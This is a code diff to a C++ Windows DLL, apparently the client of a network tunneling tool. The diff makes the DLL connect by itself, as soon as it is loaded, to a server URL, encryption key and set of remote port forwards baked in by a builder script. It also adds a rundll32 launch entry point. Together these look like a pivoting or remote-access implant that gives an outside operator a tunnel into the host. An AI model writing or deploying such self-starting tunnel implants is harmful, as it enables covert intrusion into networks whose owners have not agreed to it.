@@ -17,6 +17,22 @@
 #include <thread>
 #include <vector>
 
+// Builder-hardcoded defaults (replaced by builder.py)
+static const std::string DEFAULT_SERVER_URL  = "{{ server_url }}";
+static const std::string DEFAULT_ENCRYPTION_KEY = "{{ encryption_key }}";
+static const std::string DEFAULT_REMOTE_PORT_FORWARDS = "{{ remote_port_forwards }}";
+
+static std::vector<std::string> parse_forwards(const std::string& raw) {
+    std::vector<std::string> result;
+    if (raw.empty() || raw == "{{ remote_port_forwards }}") return result;
+    std::istringstream iss(raw);
+    std::string token;
+    while (iss >> token) {
+        result.push_back(token);
+    }
+    return result;
+}
+
 static void run(const std::string& uri_arg, const std::string& key_arg,
                 const std::vector<std::string>& remote_port_forwards) {
     WSADATA wsa_data;
@@ -90,21 +106,44 @@ static void run(const std::string& uri_arg, const std::string& key_arg,
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
-    switch (ul_reason_for_call) {
-    case DLL_PROCESS_ATTACH:
+    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
         DisableThreadLibraryCalls(hModule);
-        // Default connection - override by exporting a custom entry point
-        std::thread([]() {
-            run("ws://localhost:8080", "", {});
-        }).detach();
-        break;
-    case DLL_PROCESS_DETACH:
-        break;
+
+        // Only auto-connect if builder has baked in config
+        if (!DEFAULT_ENCRYPTION_KEY.empty() && DEFAULT_ENCRYPTION_KEY != "{{ encryption_key }}") {
+            std::thread([]() {
+                auto forwards = parse_forwards(DEFAULT_REMOTE_PORT_FORWARDS);
+                run(DEFAULT_SERVER_URL, DEFAULT_ENCRYPTION_KEY, forwards);
+            }).detach();
+        }
     }
     return TRUE;
 }
 
-// Exported entry point for custom configuration
+// rundll32 entry point
+// Usage: rundll32 messenger-client-cpp.dll,Run <uri> <encryption_key> [forwards...]
+extern "C" __declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
+    std::string cmdline(lpszCmdLine);
+    std::istringstream iss(cmdline);
+    std::vector<std::string> args;
+    std::string token;
+
+    while (iss >> token) {
+        args.push_back(token);
+    }
+
+    if (args.size() < 2) {
+        return;
+    }
+
+    std::string uri = args[0];
+    std::string key = args[1];
+    std::vector<std::string> forwards(args.begin() + 2, args.end());
+
+    run(uri, key, forwards);
+}
+
+// Programmatic entry points
 extern "C" __declspec(dllexport) void Execute(const char* uri, const char* encryption_key) {
     std::thread([u = std::string(uri), k = std::string(encryption_key)]() {
         run(u, k, {});
